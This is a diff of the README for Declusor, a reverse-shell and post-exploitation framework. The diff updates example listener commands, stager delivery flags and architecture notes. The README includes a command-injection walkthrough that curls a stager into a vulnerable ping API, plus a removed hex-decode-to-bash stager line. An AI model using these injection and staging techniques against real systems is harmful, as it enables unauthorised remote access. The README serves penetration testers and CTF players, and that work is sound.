@@ -3,7 +3,7 @@
   <h1>Declusor</h1>
 
   <p>
-    <strong>A fast, modular, and extensible reverse-shell framework and payload delivery handler for security professionals and CTF players.</strong>
+    <strong>Catch, stabilize, and orchestrate reverse shells with zero friction. Designed for post-exploitation with single-socket in-memory staging, framed execution streams, and an autonomous plugin architecture.</strong>
   </p>
 
   <p>
@@ -55,12 +55,12 @@ When an operator launches Declusor, the entire engagement workflow is automated:
 
 <div align="center">
 
-| Step | Phase                 | Operator Experience                          | Target Impact                         |
-| ---: | :-------------------- | :------------------------------------------- | :------------------------------------ |
-|    1 | Listener Launch       | Single CLI command (`declusor 0.0.0.0 4444`) | Prints pre-formatted stager one-liner |
-|    2 | Session Establishment | Automatic connection detection & handshake   | Zero manual PTY stabilization needed  |
-|    3 | Command Dispatch      | Framed streaming with tab-completion         | Output streamed back chunk-by-chunk   |
-|    4 | Post-Exploitation     | In-memory module loading (`load ...`)        | Execution memory-resident; clean exit |
+| Step | Phase                 | Operator Experience                            | Target Impact                         |
+| ---: | :-------------------- | :--------------------------------------------- | :------------------------------------ |
+|    1 | Listener Launch       | Single CLI command (`declusor 127.0.0.1 4444`) | Prints pre-formatted stager one-liner |
+|    2 | Session Establishment | Automatic connection detection & handshake     | Zero manual PTY stabilization needed  |
+|    3 | Command Dispatch      | Framed streaming with tab-completion           | Output streamed back chunk-by-chunk   |
+|    4 | Post-Exploitation     | In-memory module loading (`load ...`)          | Execution memory-resident; clean exit |
 
 </div>
 
@@ -79,37 +79,43 @@ Start Declusor by specifying your local listening IP and port:
 
 ```bash
 # Default listener (uses native shell_socket client)
-declusor 0.0.0.0 4444
+declusor 127.0.0.1 4444
 
 # Select the cross-platform Python client
-declusor 0.0.0.0 4444 --plugin py_socket
+declusor 127.0.0.1 4444 --plugin py_socket
 
 # Load external custom plugins from an operator directory
-declusor 0.0.0.0 4444 --plugin-dir ~/custom_plugins --plugin my_agent
+declusor 127.0.0.1 4444 --plugin-dir ~/custom_plugins --plugin my_agent
 ```
 
 On startup, Declusor initializes the listener and **prints the exact one-liner launcher command** to run on your target.
 
 ### 2. Built-in Client Transports
 
-| Client Plugin     | Flag              | Target OS             | Execution Mechanism                                                    |
-| :---------------- | :---------------- | :-------------------- | :--------------------------------------------------------------------- |
-| **Shell Socket**  | `-p shell_socket` | Linux / POSIX         | Native `/dev/tcp` file descriptor; zero external dependencies          |
-| **Python Socket** | `-p py_socket`    | Linux, macOS, Windows | In-memory `exec()` with persistent session scope & subprocess fallback |
+| Client Plugin     | Flag              | Target OS             | Execution Mechanism                                                                                   |
+| :---------------- | :---------------- | :-------------------- | :---------------------------------------------------------------------------------------------------- |
+| **Shell Socket**  | `-p shell_socket` | Linux / POSIX         | Native `/dev/tcp` file descriptor; ~85-char micro-stager that bootstraps Stage 1 over the same socket |
+| **Python Socket** | `-p py_socket`    | Linux, macOS, Windows | In-memory `exec()` with persistent session scope & compact ~135-char single-socket bootstrap loader   |
 
 ### 3. Launcher Delivery Options
 
-Operators can control how client stagers are presented or exported via global delivery flags:
+Declusor features an extensible **single-socket stager micro-framework**. Operators can control how launchers are staged and delivered using global delivery flags:
 
 ```bash
-# Print launcher to terminal (default)
-declusor 0.0.0.0 4444 -p shell_socket
+# Print staged one-liner to terminal (default)
+declusor 127.0.0.1 4444 -p shell_socket
 
-# Suppress launcher output (silent mode for automation/scripts)
-declusor 0.0.0.0 4444 -p shell_socket --launcher-output silent
+# Copy launcher directly to system clipboard (clean terminal output; uses OSC 52 + OS clipboard)
+declusor 127.0.0.1 4444 -p shell_socket -O clipboard
 
-# Write launcher directly to a file
-declusor 0.0.0.0 4444 -p py_socket --launcher-output file:/tmp/stager.py
+# Monolithic stageless client (embeds full payload without second-stage staging)
+declusor 127.0.0.1 4444 -p shell_socket -K stageless
+
+# Suppress launcher output (silent mode for headless automation and CI/CD)
+declusor 127.0.0.1 4444 -p shell_socket -O silent
+
+# Write launcher directly to an output file
+declusor 127.0.0.1 4444 -p py_socket -O file:/tmp/stager.py
 ```
 
 ### 4. Interact with the Session
@@ -165,27 +171,23 @@ Content-Type: application/json
 {"ip": "127.0.0.1; <STAGER_PAYLOAD>"}
 ```
 
-**1. Start Declusor locally on your interface:**
+**1. Start Declusor locally on your interface (e.g. copying launcher to clipboard):**
 
 ```bash
-declusor 127.0.0.1 4444 --plugin shell_socket
+declusor 127.0.0.1 4444 --plugin shell_socket -O clipboard
 ```
 
-**2. Declusor will immediately print the tailored, hex-encoded launcher one-liner ready for execution:**
+**2. Inject the ~85-character one-liner directly into the vulnerable parameter:**
 
 ```bash
-# Inject the displayed one-liner directly via curl
+# Inject the compact stager directly via curl
 curl -s -X POST https://target.example/api/diagnostics/ping \
-     -H "Content-Type: application/json" \
-  -d "{\"ip\": \"127.0.0.1; <DECLUSOR_SHELL_SOCKET_HEX_LAUNCHER>\"}"
+    -H "Content-Type: application/json" -d '{"ip": "127.0.0.1; exec 3<>[...]"}'
 ```
 
-**3. Upon connection, Declusor runs its in-memory handshake, pushes helper utilities, and opens an interactive REPL with full history and tab-completion.**
+**3. Upon connection, Declusor immediately transmits the Stage 1 client payload over the same established socket descriptor (FD 3). The client evaluates it in-memory, negotiates the framed session handshake, and opens the interactive REPL:**
 
 ```console
-$ declusor 127.0.0.1 4444
-bash -c 'printf "%s" "$1" | while IFS= read -r -n2 byte; do printf "%b" "\\x$byte"; done | bash' _ '<DECLUSOR_HEX_STAGER>'
-
 [declusor]
 ```
 
@@ -233,7 +235,7 @@ git clone https://github.com/othonhugo/declusor.git
 cd declusor
 uv sync --no-default-groups
 make install-plugins
-.venv/bin/declusor 0.0.0.0 4444
+.venv/bin/declusor 127.0.0.1 4444
 ```
 
 #### Option B: Install from GitHub with `pip`
@@ -250,7 +252,7 @@ python -m pip install -e .
 make install-plugins
 
 # Start the CLI
-declusor 0.0.0.0 4444
+declusor 127.0.0.1 4444
 ```
 
 ## Extensible Plugin Ecosystem
@@ -288,6 +290,8 @@ For complete packaging tutorials, asset overlay mechanics, and step-by-step guid
 Declusor adheres to strict **Clean Architecture** and **Dependency Inversion** principles:
 
 - **Strict 11-Tier Downward Hierarchy**: Dependencies flow downward through 11 cleanly separated layers from composition roots (`main`, `app`) down to foundational primitives (`config`, `util`), with pure domain contracts (`contract`) completely decoupled from concrete plugins.
+- **Deterministic Contract-First Design**: Pure domain contracts with zero reflection probing (`hasattr`/`getattr`) or duck-typing. Dynamic plugin and route registries validate interface satisfaction through rigid validation barriers before registration.
+- **Single-Socket Stager Bootstrap**: Stage 0 micro-stagers reuse the established TCP connection to stream and execute Stage 1 payloads in-memory, avoiding secondary network drops or reconnect delays.
 - **Dynamic Signature Introspection**: Application and transport factories dynamically inspect parameter signatures via `inspect.signature`, enabling flexible headless dependency injection (`listener_factory`, `launcher_renderer`) without fragile exception-catching.
 - **Dual-Channel Stream Isolation**: Physical separation of raw binary payloads (`sys.stdout.buffer`) from formatted console output (`sys.stdout`) guarantees zero stream corruption or terminal bleeding.
 - **Pluggable & Composable Transports**: The transport layer (`declusor.transport`) isolates physical network mechanics behind `ITransport` and `ITransportListener`, supporting composable decorator pipelines (e.g. XOR obfuscation) without touching session logic.
